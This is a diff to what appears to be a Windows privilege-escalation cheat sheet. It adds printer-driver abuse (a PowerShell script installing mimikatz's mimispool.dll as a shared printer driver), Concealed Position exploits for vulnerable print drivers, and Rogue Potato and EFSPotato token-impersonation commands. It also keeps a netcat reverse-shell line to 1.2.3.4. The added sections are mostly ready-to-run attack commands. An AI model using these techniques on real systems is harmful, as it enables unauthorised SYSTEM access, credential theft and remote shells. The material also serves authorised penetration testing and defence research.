@@ -35,27 +35,32 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
+* [EoP - Printers](#eop-printers)
+    * [Universal Printer](#universal-printer)
+    * [Bring Your Own Vulnerability](#bring-your-own-vulnerability)
 * [EoP - Runas](#eop---runas)
 * [EoP - Abusing Shadow Copies](#eop---abusing-shadow-copies)
 * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
 * [EoP - Impersonation Privileges](#eop---impersonation-privileges)
-  * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)
-  * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
-  * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
-  * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
+    * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)
+    * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
+    * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
+    * [Juicy Potato (Abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
+    * [Rogue Potato (Fake OXID Resolver)](#rogue-potato-fake-oxid-resolver))
+    * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](#efspotato-ms-efsr-efsrpcopenfileraw))
 * [EoP - Privileged File Write](#eop---privileged-file-write)
     * [DiagHub](#diaghub)
     * [UsoDLLLoader](#usodllloader)
     * [WerTrigger](#wertrigger)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
-  * [MS08-067 (NetAPI)](#ms08-067-netapi)
-  * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
-  * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
-  * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
-  * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
-  * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
-  * [CVE-2019-1388](#cve-2019-1388)
+    * [MS08-067 (NetAPI)](#ms08-067-netapi)
+    * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
+    * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
+    * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
+    * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
+    * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
+    * [CVE-2019-1388](#cve-2019-1388)
 * [EoP - $PATH Interception](#eop---path-interception)
 * [References](#references)
 
@@ -950,6 +955,67 @@ Citrix USB Filter Driver
 <SNIP>
 ```
 
+## EoP - Printers
+
+### Universal Printer
+
+Create a Printer
+
+```ps1
+$printerName     = 'Universal Priv Printer'
+$system32        = $env:systemroot + '\system32'
+$drivers         = $system32 + '\spool\drivers'
+$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
+ 
+Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
+Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
+Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
+ 
+Add-PrinterDriver -Name       'Generic / Text Only'
+Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
+ 
+New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
+```
+
+Execute the driver
+
+```ps1
+$serverName  = 'dc.purple.lab'
+$printerName = 'Universal Priv Printer'
+$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
+Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
+Add-Printer -ConnectionName $fullprinterName
+```
+
+### Bring Your Own Vulnerability
+
+Concealed Position : https://github.com/jacob-baines/concealed_position
+
+* ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE
+* RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE
+* POISONDAMAGE - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6 Print Driver LPE
+* SLASHINGDAMAGE - [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows Print Spooler LPE
+
+```powershell
+cp_server.exe -e ACIDDAMAGE
+# Get-Printer
+# Set the "Advanced Sharing Settings" -> "Turn off password protected sharing"
+cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
+cp_client.exe -l -e ACIDDAMAGE
+```
+
 ## EoP - Runas
 
 Use the `cmdkey` to list the stored credentials on the machine.
@@ -1068,7 +1134,6 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
 ```
 
-
 ### Meterpreter getsystem and alternatives
 
 ```powershell
@@ -1081,8 +1146,8 @@ python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
 
 ### RottenPotato (Token Impersonation)
 
-Binary available at : https://github.com/foxglovesec/RottenPotato
-Binary available at : https://github.com/breenmachine/RottenPotatoNG
+* Binary available at : https://github.com/foxglovesec/RottenPotato
+* Binary available at : https://github.com/breenmachine/RottenPotatoNG
 
 ```c
 getuid
@@ -1101,10 +1166,12 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 ```
 
 
-### Juicy Potato (abusing the golden privileges)
+### Juicy Potato (Abusing the golden privileges)
 
-Binary available at : https://github.com/ohpe/juicy-potato/releases    
-:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +. 
+> If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**    
+> If the machine is **< Windows 10 1809 < Windows Server 2019** - Try **Juicy Potato**
+
+* Binary available at : https://github.com/ohpe/juicy-potato/releases    
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -1134,6 +1201,39 @@ Binary available at : https://github.com/ohpe/juicy-potato/releases
         {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
         [+] CreateProcessWithTokenW OK
     ```
+
+### Rogue Potato (Fake OXID Resolver)
+
+* Binary available at https://github.com/antonioCoco/RoguePotato
+
+```powershell
+# Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
+socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
+
+# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. 
+# Use this if you have fw restrictions.
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
+
+# RoguePotato all in one with RogueOxidResolver running locally on port 9999
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
+
+#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
+```
+
+### EFSPotato (MS-EFSR EfsRpcOpenFileRaw)
+
+* Binary available at https://github.com/zcgonvh/EfsPotato
+
+```powershell
+# .NET 4.x
+csc EfsPotato.cs
+csc /platform:x86 EfsPotato.cs
+
+# .NET 2.0/3.5
+C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs
+C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs
+```
 
 
 ## EoP - Privileged File Write
@@ -1349,3 +1449,4 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
 * [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
 * [Abusing SeLoadDriverPrivilege for privilege escalation - 14 - JUN - 2018 - OSCAR MALLO](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
+* [Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021)](https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/)
